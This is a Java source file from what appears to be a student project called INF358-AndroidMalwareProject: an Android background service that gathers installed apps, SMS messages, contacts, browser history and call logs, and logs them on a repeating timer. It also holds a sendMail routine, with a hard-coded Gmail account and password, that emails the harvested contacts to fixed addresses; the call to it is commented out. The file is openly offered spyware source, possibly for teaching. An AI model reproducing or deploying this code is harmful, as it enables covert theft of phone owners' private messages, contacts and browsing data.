/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.service;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.IBinder;
import android.util.Log;

import com.malware.data.FetchHistoryTask;
import com.malware.data.FetchInstalledAppsTask;
import com.malware.data.HistoryEntry;
import com.malware.mail.SendMailTask;
import com.malware.phone.FetchAllCallTask;
import com.malware.phone.FetchAllSmsTask;
import com.malware.phone.FetchContactsTask;

public class MyService extends Service {

	private IBinder mBinder;
	private boolean mAllowRebind;
	private Timer t;
	private TimerTask tt;

	private final boolean VERBOSE = true;
	private final String TAG = "MalwareService";

	@Override
	public void onCreate() {

		if (VERBOSE) Log.v(TAG, "Creating service");

		ContentResolver cr = getContentResolver();
		
		Log.v(TAG, "--> Fetching installed apps");
		(new FetchInstalledAppsTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,getPackageManager());

		Log.v(TAG, "--> Fetching all sms");
		(new FetchAllSmsTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,cr);

		Log.v(TAG, "--> Fetching contacts");
		(new FetchContactsTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, cr);
		
		Log.v(TAG, "--> Fetching web history");
		(new FetchHistoryTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR,cr);

		Log.v(TAG, "--> Fetching CallLog");
		(new FetchAllCallTask()).execute(getContentResolver());

//		Log.v(TAG, "--> Fetching GPS localisation");
//		FetchLocalisation gps = new FetchLocalisation(getApplicationContext());
//		Log.d(TAG, "Latitude = " + gps.getLatitude());
//		Log.d(TAG, "Longitude = " + gps.getLongitude()); 
		
		// Prepare task to regularly display the information to hack
		prepareLoop();
	}

	private void prepareLoop() {
		t = new Timer();
		tt = new TimerTask() {

			@Override
			public void run() {
				
				if (VERBOSE) Log.v(TAG, "--> Updating...");
				
				String label = FetchInstalledAppsTask.getLabel();
				String registeredSMS = FetchAllSmsTask.getListOfSms();
				ArrayList<ArrayList<String>> contactsList = FetchContactsTask.getContactsList();
				String callLogs = FetchAllCallTask.getCallList();
				ArrayList<HistoryEntry> listEntry = FetchHistoryTask.getListEntry();
				
				if (VERBOSE) {
					Log.i(TAG, "Installed apps:");
					Log.v(TAG, label);
					
					Log.i(TAG, "Contacts:");
					for (int j = 0 ; j < contactsList.size() ; j++) {
						Log.v(TAG, contactsList.get(j).get(0) + " " + contactsList.get(j).get(1));
					}
					
					Log.i(TAG, "SMS:");
					Log.v(TAG, registeredSMS);
					
					Log.i(TAG, "Call logs:");
					Log.v(TAG, callLogs);
					
					Log.i(TAG, "History Entry");
					for (int j = 0 ; j < listEntry.size() ; j++) {
						HistoryEntry entry = listEntry.get(j); 
						Log.v(TAG, entry.getTitle() + "\n" + entry.getUrl());
					}
				}
				
//				if (contactsList != null)
//						sendMail(contactsList);
				
				if (VERBOSE) Log.v(TAG, "--> Update done");
			}
		};
	}

	private void sendMail(ArrayList<ArrayList<String>> contactsList) {
		
		// Gmail address created for the project
		String fromEmail = "ckahckah@gmail.com";
		String fromPassword = "projetinf358";
		
		// Recipients
		String toEmails = "medori.julien@gmail.com, hakim.walid92000@gmail.com";
		List<String> toEmailList = Arrays.asList(toEmails.split("\\s*,\\s*"));
		
		if (VERBOSE) Log.i(TAG, "To List: " + toEmailList);
		
		String emailSubject = "Contacts sur le téléphone";
		String emailBody = "";
		
		for (int j = 0 ; j < contactsList.size() ; j++) {
			emailBody += contactsList.get(j).get(0) + " " + contactsList.get(j).get(1) + "\n\n";
		}
		
		(new SendMailTask()).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, fromEmail,fromPassword, toEmailList, emailSubject, emailBody);
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		if (VERBOSE) Log.v(TAG, "Starting service");

		t.scheduleAtFixedRate(tt, 10000, 1500000);
		
		return Service.START_STICKY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// A client is binding to the service with bindService()
		return mBinder;
	}

	@Override
	public boolean onUnbind(Intent intent) {
		// All clients have unbound with unbindService()
		return mAllowRebind;
	}

	@Override
	public void onRebind(Intent intent) {
		// A client is binding to the service with bindService(),
		// after onUnbind() has already been called
	}

	@Override
	public void onDestroy() {
		// The service is no longer used and is being destroyed
		if (VERBOSE) Log.v(TAG, "Destroying service");
		t.cancel();
	}
}
